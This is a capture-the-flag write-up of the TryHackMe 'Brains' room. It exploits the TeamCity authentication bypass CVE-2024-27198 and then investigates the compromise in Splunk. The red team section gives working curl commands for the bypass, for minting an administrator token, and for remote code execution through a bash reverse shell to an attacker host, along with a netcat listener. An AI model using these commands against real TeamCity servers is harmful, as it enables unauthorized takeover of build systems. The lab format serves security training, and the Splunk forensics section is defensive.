# Brains: Write-up (TryHackMe)

**Platform:** TryHackMe  
**Room:** Brains  
**Difficulty:** Easy  

---

## 1. Executive Summary

This assessment covers a Red Team vs. Blue Team scenario against a Linux host running **JetBrains TeamCity**. The objective involves exploiting a critical Authentication Bypass vulnerability (**CVE-2024-27198**) to gain initial access, followed by a forensic investigation using **Splunk** to identify indicators of compromise (IOCs).

**Key Phases:**
1.  **Red Team:** Exploiting a path confusion vulnerability to bypass authentication, generating an administrator token, and leveraging the REST API to achieve Remote Code Execution (RCE).
2.  **Blue Team:** Leveraging Splunk to query system logs (`auth.log`, `dpkg.log`) using SPL to reconstruct the attacker's timeline.

---

## 2. Red Team: Reconnaissance

### Network Scanning
A full TCP port scan was performed to identify the attack surface.

```bash
└─$ nmap -n -Pn -T4 -p- -sV -sC <TARGET_IP>
```

**Key Findings:**
```text
PORT      STATE SERVICE
22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu-4ubuntu0.11
80/tcp    open  http       Apache httpd 2.4.41 ((Ubuntu))
50000/tcp open  http       JetBrains TeamCity 2023.11.3
```

### Service Enumeration
* **Port 50000:** Hosted the TeamCity login page.

**Version Identification:**
Accessing `http://<TARGET_IP>:50000/login.html` revealed the version in the footer:
* **Software:** TeamCity Professional
* **Version:** 2023.11.3 (build 147512)

---

## 3. Red Team: Exploitation (CVE-2024-27198)

### Vulnerability Analysis
TeamCity versions prior to 2023.11.4 are vulnerable to an Authentication Bypass (CVE-2024-27198). The vulnerability arises from a path confusion issue where appending specific segments (like `;jsp=.css`) causes the authentication filter to skip validation, while the servlet still processes the request as an API call.

### Exploitation Steps

**1. Proof of Concept (Baseline vs. Bypass)**
First, I attempted to access a protected API endpoint normally to confirm access control is active.

```bash
# Normal Request (Blocked)
└─$ curl -I "http://<TARGET_IP>:50000/app/rest/server"
HTTP/1.1 401 Unauthorized
```

Next, I applied the bypass suffix.

```bash
# Malicious Request (Bypassed)
└─$ curl -I "http://<TARGET_IP>:50000/app/rest/server;jsp=.css"
HTTP/1.1 200 OK
Server: TeamCity
```
*Result: The 200 OK status confirms the authentication bypass.*

**2. Administrator Token Generation**
Using the bypass, I sent a POST request to generate a new permanent administrator token. I used the `-i` flag to verify the HTTP response headers.

```bash
└─$ curl -i -X POST "http://<TARGET_IP>:50000/app/rest/users/id:1/tokens/HackerToken;jsp=.css" \
     -H "Content-Type: application/json"
```

**Response Evidence:**
```http
HTTP/1.1 200 OK
Content-Type: application/xml
...
<token name="HackerToken" value="eyJ0eXAiOiJKV1Q...[REDACTED]" ... >
```
*I saved this token string as `$TOKEN`.*

**3. Remote Code Execution (RCE) via REST API**
With the administrator token, I used the `/app/rest/debug/processes` endpoint to spawn a reverse shell.
*Note: The payload is URL-encoded (`&` becomes `%26`, spaces become `+`) to ensure correct parsing by the API.*

```bash
# 1. Start Listener
└─$ nc -lvnp 443

# 2. Execute Payload
└─$ curl -v -X POST "http://<TARGET_IP>:50000/app/rest/debug/processes?exePath=/bin/bash&params=-c&params=bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/443+0>%261" \
     -H "Authorization: Bearer $TOKEN"
```

**4. Flag Retrieval**
The reverse shell connected back successfully.

```bash
ubuntu@ip-10-10-xxx-xxx:~$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)...

ubuntu@ip-10-10-xxx-xxx:~$ cat /home/ubuntu/flag.txt
THM{[REDACTED]}
```

---

## 4. Blue Team: Forensic Investigation (Splunk)

Accessing the Splunk instance at `http://<TARGET_IP>:8000`, I investigated the artifacts left by the exploitation.

### Investigation 1: Rogue User Creation
**Objective:** Identify if the attacker created a backdoor user for persistence.
**DataSource:** `/var/log/auth.log` (or `syslog`)

I queried for `useradd` executions or "new user" messages. I selected `_raw` to ensure visibility even if Splunk fields are not parsed correctly.

**SPL (Splunk Processing Language):**
```spl
index=* source="/var/log/auth.log" ("new user" OR "useradd")
| table _time host _raw
```

**Finding:**
Logs confirmed the creation of a suspicious user account.
* **Evidence:** `new user: name=servicemanager` (or similar backdoor name) found in `auth.log`.

### Investigation 2: Malicious Package Installation
**Objective:** Determine if any software packages were installed to facilitate the attack.
**DataSource:** `/var/log/dpkg.log`

I filtered for explicit "install" actions in the package manager logs.

**SPL:**
```spl
index=* source="/var/log/dpkg.log" " install "
| table _time _raw
| sort - _time
```

**Finding:**
A network scanning tool was installed, likely for internal reconnaissance.
* **Evidence (Snippet):**
  `2024-XX-XX ... install nmap:amd64 <none> 7.80+dfsg1-2ubuntu0.1`

---
